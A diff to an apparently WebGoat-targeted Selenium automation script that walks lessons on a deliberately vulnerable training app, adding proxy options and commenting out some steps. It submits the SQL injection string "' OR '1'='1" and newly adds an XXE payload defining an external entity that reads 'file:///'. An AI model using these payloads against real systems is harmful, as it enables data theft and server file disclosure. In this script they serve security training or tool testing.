@@ -10,7 +10,7 @@ import org.openqa.selenium.chrome.ChromeDriver;
 import org.openqa.selenium.chrome.ChromeOptions;
 
 public class ChromeScript {
-    public static void run(String un, String pw, String url, boolean headless, String driverPath, String browserBin) {
+    public static void run(String un, String pw, String url, boolean headless, boolean proxy, String proxyHost, String proxyPort, String driverPath, String browserBin) {
         ChromeOptions chromeOptions = new ChromeOptions();
         if (!browserBin.equals("null")) {
             chromeOptions.addExtensions(new File(browserBin));
@@ -21,6 +21,11 @@ public class ChromeScript {
         if (headless) {
             chromeOptions.addArguments("--headless");
         }
+
+        if (proxy) {
+            chromeOptions.addArguments("--proxy-server=" + proxyHost + ":" + proxyPort);
+        }
+    
         if (System.getProperty("os.name").startsWith("Windows")) {
             chromeOptions.addArguments("--disable-gpu");
         }
@@ -50,7 +55,7 @@ public class ChromeScript {
             driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/6");
             delay(1000);
             retryingFindSendKeys(driver, By.xpath("//*[@id=\"lesson-content-wrapper\"]/div[6]/div[9]/div[2]/form/table/tbody/tr/td[2]/input"), "' OR '1'='1");
-            // driver.findElement(By.name("account")).sendKeys("' OR '1'='1");
+            //driver.findElement(By.name("account")).sendKeys("' OR '1'='1");
             driver.findElement(By.name("Get Account Info")).click();
 
             // Navigate to Numeric SQL Injection section
@@ -65,31 +70,32 @@ public class ChromeScript {
             driver.findElement(By.name("userid_6b")).sendKeys("dave");
             driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[5]/div[3]/form/table/tbody/tr/td[3]/input")).click();
 
-            driver.get(url + "/start.mvc#lesson/SqlInjectionAdvanced.lesson/4");
-            driver.findElement(By.id("username4")).sendKeys("username");
-            driver.findElement(By.id("password4")).sendKeys("password");
-            driver.findElement(By.id("login-submit")).click();
+            // This is not a valid exploit and commenting out for now
+            //driver.get(url + "/start.mvc#lesson/SqlInjectionAdvanced.lesson/4");
+            //driver.findElement(By.id("username4")).sendKeys("username");
+            //driver.findElement(By.id("password4")).sendKeys("password");
+            //driver.findElement(By.id("login-submit")).click();
 
             // SQL Injection (mitigations)
-            driver.navigate().to(url + "/start.mvc#lesson/SqlInjectionMitigations.lesson/7");
-            delay(1000);
-            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[10]/div[3]/form[1]/div/div/div/table/thead/tr/th[4]/span")).click();
+            //driver.navigate().to(url + "/start.mvc#lesson/SqlInjectionMitigations.lesson/7");
+            //delay(1000);
+            //driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[10]/div[3]/form[1]/div/div/div/table/thead/tr/th[4]/span")).click();
 
             // XXE (page 3)
             driver.navigate().to(url + "/start.mvc#lesson/XXE.lesson/2");
-            driver.findElement(By.id("commentInputSimple")).sendKeys("Test comment");
+            driver.findElement(By.id("commentInputSimple")).sendKeys("<!DOCTYPE user [<!ENTITY root SYSTEM \"file:///\"> ]><comment><text>&root;");
             driver.findElement(By.id("postCommentSimple")).submit();
 
             // XXE (page 4)
             driver.navigate().to(url + "/start.mvc#lesson/XXE.lesson/3");
             retryingFindSendKeys(driver, By.id("commentInputContentType"), "Test comment 2");
-            // driver.findElement(By.id("commentInputContentType")).sendKeys("Test comment 2");
+            // not my comment out driver.findElement(By.id("commentInputContentType")).sendKeys("Test comment 2");
             driver.findElement(By.id("postCommentContentType")).submit();
 
             //XXE (page 7)
-            driver.navigate().to(url + "/start.mvc#lesson/XXE.lesson/6");
-            driver.findElement(By.id("commentInputBlind")).sendKeys("Test comment 3");
-            driver.findElement(By.id("postCommentBlind")).submit();
+            //driver.navigate().to(url + "/start.mvc#lesson/XXE.lesson/6");
+            //driver.findElement(By.id("commentInputBlind")).sendKeys("Test comment 3");
+            //driver.findElement(By.id("postCommentBlind")).submit();
 
             // XSS (page 2)
             driver.navigate().to(url + "/start.mvc#lesson/CrossSiteScripting.lesson/1");
